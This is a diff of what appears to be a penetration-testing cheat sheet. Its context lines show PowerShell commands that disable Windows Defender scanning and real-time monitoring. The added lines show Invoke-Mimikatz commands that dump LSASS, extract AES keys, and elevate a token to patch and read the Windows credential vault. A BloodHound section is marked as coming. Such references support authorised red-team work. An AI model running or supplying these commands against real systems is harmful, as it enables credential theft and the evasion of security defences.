@@ -129,6 +129,15 @@ Set-MpPreference -DisableArchiveScanning  $true
 Set-MpPreference -DisableIntrusionPreventionSystem  $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# Mimikatz Dump LSASS
+
+Invoke-Mimikatz (basic)
+
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)
+
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)
+
+
 # BloodHound
 
 coming ...
